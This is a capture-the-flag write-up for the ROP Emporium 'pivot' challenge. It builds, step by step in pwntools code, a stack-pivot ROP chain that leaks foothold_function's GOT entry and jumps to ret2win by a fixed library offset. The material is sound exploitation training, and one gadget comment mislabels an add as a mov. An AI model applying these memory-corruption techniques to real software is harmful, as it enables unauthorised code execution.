# PIVOT

[pivot](https://ropemporium.com/challenge/pivot.html)

Ever heard of "2 birds 1 stone"? This is what the author of ROP Emporium has given us. Not only do we have to create 2 separate ROP chains (using a stack pivot), we also have to somehow call the `ret2win()` function in `libpivot.so` that isn't imported by `pivot`.

Why do we need to pivot our stack to a new location? Well, the `pivot` program only permits us to write 64 bytes into our buffer. Since, our buffer is 32 bytes, we only have 24 bytes to work with. Fortunately, the author of ROP Emporium has magnanimously bestowed 256 bytes to work with after we have pivoted our stack pointer over to the new heap-allocated memory location.

```
$ objdump -M intel -D ./pivot
...
  40094c:       48 8b 45 d8             mov    rax,QWORD PTR [rbp-0x28] <- location of heap
  400950:       ba 00 01 00 00          mov    edx,0x100 <- 256 bytes of space on the heap
  400955:       48 89 c6                mov    rsi,rax
  400958:       bf 00 00 00 00          mov    edi,0x0
  40095d:       e8 ae fd ff ff          call   400710 <read@plt>
...
  400985:       48 8d 45 e0             lea    rax,[rbp-0x20]
  400989:       ba 40 00 00 00          mov    edx,0x40 <- How many bytes we can write into buffer
  40098e:       48 89 c6                mov    rsi,rax
  400991:       bf 00 00 00 00          mov    edi,0x0
  400996:       e8 75 fd ff ff          call   400710 <read@plt>
...
```

## Pivoting the stack

The first order of business is setting `rsp` to the location of the heap. Thankfully, `pivot` tells us exactly where the malloc'd heap region can be found.

```
$ ./pivot
pivot by ROP Emporium
x86_64

Call ret2win() from libpivot
The Old Gods kindly bestow upon you a place to pivot: 0x7f94185fef10
Send a ROP chain now and it will land there
> 
```

Unfortunately, the address of this heap-allocated region keeps changing (due to the behaviour of `malloc`), so we have to somehow save this address into our `win.py` script. The following snippets takes the fifth line outputted by `pivot` and extracts the memory address from the end of that line. The memory address is then stored under the variable called `pivot_point`.

```python
from pwn import *
...
def get_pivot_point(pivot_line: str) -> int:
    """
    extract memory address from fifth line
    """
    num_index = pivot_line.index("0x") # find memory address
    address_str = pivot_line[num_index:] # extract memory address
    return int(address_str, 16) # convert memory address into integer
...
io.recvline()
io.recvline()
io.recvline()
io.recvline()
pivot_point = get_pivot_point(io.recvline().decode().strip())
...
```

Now that we can consistently get our heap address, we can look for ways to pivot over to that new memory region. The `usefulGadgets` function has 2 gadgets that we can use to achieve this goal:

1. 0x4009bb : pop rax ; ret
2. 0x4009bd : xchg rsp, rax ; ret

```
$ objdump -M intel -D ./pivot
...
00000000004009bb <usefulGadgets>:
  4009bb:       58                      pop    rax
  4009bc:       c3                      ret    
  4009bd:       48 94                   xchg   rsp,rax
  4009bf:       c3                      ret    
  4009c0:       48 8b 00                mov    rax,QWORD PTR [rax]
  4009c3:       c3                      ret    
  4009c4:       48 01 e8                add    rax,rbp
  4009c7:       c3                      ret    
  4009c8:       0f 1f 84 00 00 00 00    nop    DWORD PTR [rax+rax*1+0x0]
  4009cf:       00
...
```

These 2 gadgets give us an easy way to set our stack pointer to the heap area, and it just fits inside the 64 byte window that we are allowed to use.

```python
from pwn import *
...
POPRAX = p64(0x4009bb) # pop rax ; ret
XCHGRSPRAX = p64(0x4009bd) # xchg rsp, rax ; ret
...
attack = b"" # placeholder
io.sendline(attack)
...
# juicy stack pivot
smash = b"A"*0x28
smash += POPRAX + p64(pivot_point) + XCHGRSPRAX # exactly 24 bytes
io.sendline(smash)
...
```

To verify that the stack pivot work, we can try setting the `r15` register to a random value.

```python
from pwn import *
...
POPRAX = p64(0x4009bb) # pop rax ; ret
XCHGRSPRAX = p64(0x4009bd) # xchg rsp, rax ; ret
POPR15 = p64(0x400a32) # pop r15 ; ret
...
attack = POPR15 + b"aaaabbbb" # random value
io.sendline(attack)
...
# juicy stack pivot
smash = b"A"*0x28
smash += POPRAX + p64(pivot_point) + XCHGRSPRAX # exactly 24 bytes
io.sendline(smash)
...
```

Running `./win.py GDB` and typing `continue` all the way in GDB, then type `info registers`, we get this:

```
...
r15            0x6262626261616161  7089336938114670945
...
```

The `0x6262626261616161` there is actually `"aaaabbbb"` in disguise, which shows that our stack pivot worked!

## Finding ret2win

Now that we have a full fat 256 bytes of space to work with, we can lay down the groundwork to call the `ret2win` function.

The only problem is that the `ret2win()` is never explicitly imported by `pivot` from `libpivot.so`.

```
$ rabin2 -i ./pivot
[Imports]
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
1   0x004006d0 GLOBAL FUNC       free
2   0x004006e0 GLOBAL FUNC       puts
3   0x004006f0 GLOBAL FUNC       printf
4   0x00400700 GLOBAL FUNC       memset
5   0x00400710 GLOBAL FUNC       read
6   0x00000000 GLOBAL FUNC       __libc_start_main
7   0x00000000 WEAK   NOTYPE     __gmon_start__
8   0x00400720 GLOBAL FUNC       foothold_function
9   0x00400730 GLOBAL FUNC       malloc
10  0x00400740 GLOBAL FUNC       setvbuf
11  0x00400750 GLOBAL FUNC       exit
```

Luckily for us, `pivot` does import another function from `libpivot.so`, namely `foothold_function()`, which we can use as a landmark to find `ret2win()`.

Since the difference (or offset) between the memory addresses of `foothold_function()` and `ret2win()` are always the same (even if ASLR is enabled), we simply have to calculate this offset and find where `foothold_function()` was loaded into memory to find where `ret2win()` is located.

### Finding the memory address of foothold_function

Since `foothold_function()` is an imported function, we know that we can find where it is loaded by checking the memory address stored in its GOT entry in `pivot`.

```python
from pwn import *
...
exe = context.binary = ELF('./pivot')
...
# this expression tells us where foothold_function's GOT entry is, but not the memory address
# stored inside the GOT entry that tells us where foothold_function was loaded into memory
exe.got["foothold_function"]
...
```

In addition, we know that since `foothold_function()` is never *"called during normal program flow"*, it's likely that its GOT entry hasn't been populated with that memory address. To rectify this, we have to call `foothold_function()` using its PLT entry first, or setting the `LD_BIND_NOW` environment variable to a non-empty value to force the memory address to be resolved.

The first (and more orthodox) method can be done easily with the following snippet below.

```python
from pwn import *
...
POPRAX = p64(0x4009bb) # pop rax ; ret
XCHGRSPRAX = p64(0x4009bd) # xchg rsp, rax ; ret
POPR15 = p64(0x400a32) # pop r15 ; ret
...
# this forces foothold_function's GOT entry to be populated before the function is run
attack = p64(exe.plt["foothold_function"])
io.sendline(attack)
...
# juicy stack pivot
smash = b"A"*0x28
smash += POPRAX + p64(pivot_point) + XCHGRSPRAX # exactly 24 bytes
io.sendline(smash)
...
```

If you want to be chaotic evil, you can skip calling `foothold_function@plt` and do this instead:

```bash
$ LD_BIND_NOW="a non-empty string :)" ./win.py
```

Now that we have resolved `foothold_function`'s GOT entry. We have to load the memory address of `foothold_function` to a register, in this case `rax`, which is the most straightforward one. To do this, we set `rax` to the GOT entry of `foothold_function`, and set it to the memory address of `foothold_function` with a sneaky `mov rax, [rax] ; ret` gadget.

```python
from pwn import *
...
POPRAX = p64(0x4009bb) # pop rax ; ret
MOVRAXRAX = p64(0x4009c0) # mov rax, [rax] ; ret
XCHGRSPRAX = p64(0x4009bd) # xchg rsp, rax ; ret
POPR15 = p64(0x400a32) # pop r15 ; ret
...
# this forces foothold_function's GOT entry to be populated before the function is run
attack = p64(exe.plt["foothold_function"])

# after foothold_function returns to us
# the got entry of foothold_function stores the location of the actual foothold_function
attack += POPRAX + p64(exe.got["foothold_function"])
# load the location of foothold_function from foothold_function@got
attack += MOVRAXRAX # mov rax, [rax] ; ret

io.sendline(attack)
...
# juicy stack pivot
smash = b"A"*0x28
smash += POPRAX + p64(pivot_point) + XCHGRSPRAX # exactly 24 bytes
io.sendline(smash)
...
```

### Calling ret2win

All that's left is to add the offset of `ret2win` from `foothold_function`. In the 2 extra lines of code, we save the offset to `rbp` and add it to `rax`, before we call the function pointed to by `rax`, which should hopefully be `ret2win`.

```python
from pwn import *
...
POPRAX = p64(0x4009bb) # pop rax ; ret
MOVRAXRAX = p64(0x4009c0) # mov rax, [rax] ; ret
XCHGRSPRAX = p64(0x4009bd) # xchg rsp, rax ; ret
POPRBP = p64(0x4007c8) # pop rbp ; ret
CALLRAX = p64(0x4006b0) # call rax
ADDRAXRBP = p64(0x4009c4) # mov rax, rbp ; ret
POPR15 = p64(0x400a32) # pop r15 ; ret
...
# this forces foothold_function's GOT entry to be populated before the function is run
attack = p64(exe.plt["foothold_function"])

# after foothold_function returns to us
# the got entry of foothold_function stores the location of the actual foothold_function
attack += POPRAX + p64(exe.got["foothold_function"])
# load the location of foothold_function from foothold_function@got
attack += MOVRAXRAX # mov rax, [rax] ; ret
attack += POPRBP + p64(libpivot.symbols["ret2win"] - libpivot.symbols["foothold_function"]) # offset
attack += ADDRAXRBP # add offset
attack += CALLRAX

io.sendline(attack)
...
# juicy stack pivot
smash = b"A"*0x28
smash += POPRAX + p64(pivot_point) + XCHGRSPRAX # exactly 24 bytes
io.sendline(smash)
...
```
